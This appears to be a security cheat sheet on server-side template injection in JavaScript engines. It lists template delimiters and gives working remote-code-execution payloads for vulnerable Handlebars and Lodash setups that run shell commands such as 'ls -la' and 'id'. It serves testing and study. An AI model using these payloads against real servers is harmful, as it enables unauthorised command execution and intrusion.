# Server Side Template Injection - JavaScript

> Server-Side Template Injection (SSTI)  occurs when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. In the context of JavaScript, SSTI vulnerabilities can arise when using server-side templating engines like Handlebars, EJS, or Pug, where user input is integrated into templates without adequate sanitization.


## Summary

- [Templating Libraries](#templating-libraries)
- [Handlebars](#handlebars)
    - [Handlebars - Basic Injection](#handlebars---basic-injection)
    - [Handlebars - Command Execution](#handlebars---command-execution)
- [Lodash](#Lodash)
    - [Lodash - Basic Injection](#lodash---basic-injection)
    - [Lodash - Command Execution](#lodash---command-execution)
- [References](#references)


## Templating Libraries

| Template Name | Payload Format |
| ------------ | --------- |
| DotJS        | `{{= }}`  |
| DustJS       | `{}`      |
| EJS          | `<% %>`   |
| HandlebarsJS | `{{ }}`   |
| HoganJS      | `{{ }}`   |
| Lodash       | `{{= }}`  |
| MustacheJS   | `{{ }}`   |
| NunjucksJS   | `{{ }}`   |
| PugJS        | `#{}`     |
| TwigJS       | `{{ }}`   |
| UnderscoreJS | `<% %>`   |
| VelocityJS   | `#=set($X="")$X` |
| VueJS        | `{{ }}`   |


## Handlebars

[Official website](https://handlebarsjs.com/)
> Handlebars compiles templates into JavaScript functions.

### Handlebars - Basic Injection

```js
{{this}}
{{self}}
```

### Handlebars - Command Execution

This payload only work in handlebars versions, fixed in [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6):

* `>= 4.1.0`, `< 4.1.2`
* `>= 4.0.0`, `< 4.0.14`
* `< 3.0.7`

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Lodash

[Official website](https://lodash.com/docs/4.17.15)
> A modern JavaScript utility library delivering modularity, performance & extras.

### Lodash - Basic Injection

How to create a template:

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** The template string.
- **options.interpolate:** It is a regular expression that specifies the HTML *interpolate* delimiter.
- **options.evaluate:** It is a regular expression that specifies the HTML *evaluate* delimiter.
- **options.escape:** It is a regular expression that specifies the HTML *escape* delimiter.

For the purpose of RCE, the delimiter of templates is determined by the **options.evaluate** parameter.

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>


{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

### Lodash - Command Execution

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```


## References

- [Exploiting Less.js to Achieve RCE - Jeremy Buis - July 1, 2021](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
- [Handlebars template injection and RCE in a Shopify app - Mahmoud Gamal - April 4, 2019](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)